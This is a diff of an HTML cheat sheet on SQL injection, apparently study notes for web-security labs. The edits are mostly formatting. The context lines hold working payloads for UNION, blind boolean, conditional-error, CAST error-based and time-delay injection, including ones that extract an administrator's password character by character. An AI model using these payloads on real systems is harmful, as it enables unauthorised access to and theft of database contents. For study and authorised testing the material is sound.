@@ -120,6 +120,7 @@ the select statement <u>is needed a table to search from</u>, it can be any tabl
 <b>SAMPLE: </b><mark id="">' UNION SELECT ()version,NULL#</mark>
 
 <b>SAMPLE: </b><mark id="">' and substring((version()),1,1) = '0'#</mark>
+
 </details>
 <details>
 <summary>LISTING DATABASE CONTENT TECHNIQUES</summary>
@@ -127,7 +128,7 @@ the select statement <u>is needed a table to search from</u>, it can be any tabl
 
 <details>
 <summary>NON-ORACLE</summary>
-<b>PRE-REQS:</b>
+<u><b>PRE-REQS:</b></u>
 	
 1. get column number
 2. get field type
@@ -149,7 +150,7 @@ the select statement <u>is needed a table to search from</u>, it can be any tabl
 </details>
 <details>
 <summary>ORACLE</summary>
-<b>::: PRE-REQS:</b>
+<u><b>::: PRE-REQS:</b></u>
 	
 1. get column number
 2. get field type
@@ -169,13 +170,13 @@ the select statement <u>is needed a table to search from</u>, it can be any tabl
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT04')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT05')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT06')">.C3.</button>
 
 </details>
-<b>NOTE:</b> Both ways needs to know the column number, field type and both examples are assuming it has two 
-columns and both type string.
+<b>NOTE:</b> Both ways needs to know the column number, field type and both examples are assuming it has two columns and both type 
+string.
+
 </details>
 <details>
 <summary>UNION ATTACKS TECHNIQUES</summary>
-<b>DESCRIPTION:</b> If the vulnerability is present, UNION attacks can be used to retrieve content
-from other tables.
+<b>DESCRIPTION:</b> If the vulnerability is present, UNION attacks can be used to retrieve content from other tables.
 
 <b>::: STEP1:</b> GET QUERY COLUMNS NUMBER
 
@@ -193,6 +194,7 @@ from other tables.
 ... after those steps, please refer to <b>LISTING DATABASE CONTENT TECHNIQUES</b>, it will apply the same.
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#UAT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#UAT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#UAT03')">.C3.</button>
+
 <b>:::: FILTER BYPASS VIA XML ENCODING</b>
 
 <b>NOTE: </b><br>
@@ -225,6 +227,7 @@ from other tables.
 <summary>BLIND ATTACKS TECHNIQUES</summary>
 <b>DESCRIPTION:</b> Simple boolean conditions can help to detect how different the site behaves. Look for any new behavior after small changes. 
 Inspect the headers in burpsuite to check if exist something querying the application. 
+
 <details>
 <summary>CONDITIONAL RESPONSES</summary>	
 <b>C1: TRUE </b><mark id="BAT01">' AND '1'='1</mark>
@@ -232,11 +235,11 @@ Inspect the headers in burpsuite to check if exist something querying the applic
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT02')">.C2.</button>
 
-To successfully acomplish the blind attack, the boolean conditions can help. It is matter of what to ask.<br>
+To successfully acomplish the blind attack, the boolean conditions can help. It is matter of what to ask.
 
 <u>::: CHECK IF TABLE EXIST ?</u>
 	
-<b>C1: TRUE condition means table exist !</b><mark id="BAT03">' AND (SELECT 'a' FROM TABLE_NAME LIMIT 1)='a</mark><br>
+<b>C1: TRUE condition means table exist ! </b><mark id="BAT03">' AND (SELECT 'a' FROM TABLE_NAME LIMIT 1)='a</mark><br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT03')">.C1.</button>
 
 <u>::: CHECK IF COLUMN VALUE EXIST ?</u>
@@ -255,16 +258,16 @@ To successfully acomplish the blind attack, the boolean conditions can help. It 
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT05')">.C1.</button>
 
-<b>NOTE:</b> Here a series of incremental query's working with the TRUE statement are needed, once the number reached 
-hits the FALSE statement the lenght is founded.
-<br>
+<b>NOTE:</b> Here a series of incremental query's working with the TRUE statement are needed, once the number reached hits the 
+FALSE statement the lenght is founded.
+
 <u>CHECK CHARACTERS VALUE USING A METHOD "GREATHER THAN" AND "EQUALS" ?</u>
 	
 <b>C1: </b><mark id="BAT06">' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) > 'value</mark>
 <b>SAMPLE: </b><mark>' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't</mark>
 
-"first it needs a TRUE/FALSE behavior [blind sqli identified], if true the first character of the value is 
-greather than the value...
+"first it needs a TRUE/FALSE behavior [blind sqli identified], if true the first character of the value is greather than 
+the value...
 
 <b>C2: </b><mark id="BAT07">' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) = 's</mark>
 <b>SAMPLE: </b><mark>' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's</mark>
@@ -282,8 +285,8 @@ greather than the value...
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT08')">.C1.</button>
 
-So, it is the same as saying, first character in the value of column_name X is equal to "A". We need to iterate more times 
-with each letter, number, etc. For that reason a pre-req is to know the value lenght. 
+So, it is the same as saying, first character in the value of column_name X is equal to "A". We need to iterate more times with 
+each letter, number, etc. For that reason a pre-req is to know the value lenght. 
 
 <b><u>CLUSTER BOMB ATTACK !</u></b> - two positions
 
@@ -291,8 +294,8 @@ with each letter, number, etc. For that reason a pre-req is to know the value le
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT09')">.C1.</button>
 
-<b>NOTE:</b> Remember the TRUE/FALSE logic and the response associated to that. That will help to know which 
-values are correct = TRUE. 
+<b>NOTE:</b> Remember the TRUE/FALSE logic and the response associated to that. That will help to know which values are correct = TRUE. 
+
 </details>
 <details>
 <summary>CONDITIONAL ERRORS</summary>
@@ -320,8 +323,8 @@ values are correct = TRUE.
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT013')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT014')">.C2.</button>
 	
-<b>NOTE: </b> If that's OK, you can trigger an error conditionally on the truth of a specific condition. Now that you know the query
-is interpreted as SQL query, also, you know that a table exist you can guess users. 
+<b>NOTE: </b> If that's OK, you can trigger an error conditionally on the truth of a specific condition. Now that you know the query is 
+interpreted as SQL query, also, you know that a table exist you can guess users. 
 
 <b>C3: </b><mark id="BAT015">'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')||'</mark>
 <b>SAMPLE: </b><mark>'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</mark>
@@ -335,8 +338,8 @@ is interpreted as SQL query, also, you know that a table exist you can guess use
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT016')">.C4.</button>
 
-<b>NOTE: </b> This condition should be true, confirming that the password is greater than 1 character in length. Intruder attack until the error 
-dissapears, meaning the final value is the total lenght. 
+<b>NOTE: </b> This condition should be true, confirming that the password is greater than 1 character in length. Intruder attack until the 
+error dissapears, meaning the final value is the total lenght. 
 
 <b>SAMPLE: </b><mark>'||(SELECT CASE WHEN LENGTH(password)>2 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'</mark>
 <b>SAMPLE: </b><mark>'||(SELECT CASE WHEN LENGTH(password)>6 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'</mark>
@@ -354,7 +357,8 @@ dissapears, meaning the final value is the total lenght.
 
 <details>
 <summary>VISIBLE ERROR-BASED</summary>
-<b>DESCRIPTION: </b> try the different default test attempts, first need a valid syntactically query. You can determine that looking for errors. 
+<b>DESCRIPTION: </b> try the different default test attempts, first need a valid syntactically query. You can determine that looking 
+for errors. 
 
 <u>::: 1. CREATE A GENERIC SELECT SUBQUERY AND CAST THE RETURNED VALUE TO AN INT DATA TYPE</u>
 
@@ -363,8 +367,8 @@ dissapears, meaning the final value is the total lenght.
 <b>C1: </b><mark id="VEB01">' AND CAST((SELECT 1) AS int)--</mark><br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#VEB01')">.C1.</button>
 
-<b>NOTE: </b> If you get some errors about boolean expressions, you can try another comparison operator. Getting no errors means the query is 
-valid syntax format.
+<b>NOTE: </b> If you get some errors about boolean expressions, you can try another comparison operator. Getting no errors means the 
+query is valid syntax format.
 
 <b>C2: </b><mark id="VEB02">' AND 1=CAST((SELECT 1) AS int)--</mark><br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#VEB02')">.C2.</button>
@@ -385,8 +389,7 @@ valid syntax format.
 
 <b>SAMPLE: </b><mark>' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</mark>
 
-</details>	
-</details>
+</details></details>
 <details>
 <summary>TIME DELAY TECHNIQUES</summary>
 <b>DESCRIPTION: </b> Techniques used to retrieve data from database, used when there's no visible results, no errors present, etc. However,
@@ -411,10 +414,10 @@ since the query is executed synchronously, it is possible to trigger conditional
 
 <b><u>::: 2. RETRIEVE DATA</u></b>
 
-<b>pre-reqs:</b>
+<b>Pre-reqs:</b>
 	
-1. table name
-2. column name
+1. Table name
+2. Column name
 	
 <b><u>:::  CONFIRM USER</u></b>
 	
@@ -452,11 +455,12 @@ Send series of requests modifying the character count,
 <details>
 <summary>OUT-OF-BAND TECHNIQUES</summary>
 <b>DESCRIPTION: </b>
-</details>
-</details>
+
+</details></details>
 <details>
 <summary>ERROR-BASED TECHNIQUES</summary>
 <b>DESCRIPTION: </b>
+
 </details>
 </div>
 </pre>
